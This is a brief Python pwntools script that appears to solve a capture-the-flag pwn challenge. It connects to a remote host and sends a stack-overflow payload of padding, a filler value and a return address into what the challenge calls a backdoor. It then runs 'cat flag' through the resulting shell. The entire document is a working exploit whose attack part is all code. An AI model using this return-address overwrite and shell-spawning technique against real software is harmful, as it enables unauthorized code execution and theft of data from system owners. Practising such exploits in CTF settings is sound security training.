from pwn import *

io = remote('43.156.14.141', 1143)

payload = flat(['A' * 16, p64(0xdeadbeef), p64(0x401232)])

io.sendlineafter('Free backdoor for ya!\n', payload)

io.sendline(b'cat flag')
print(io.recvline().decode().strip())
io.close()
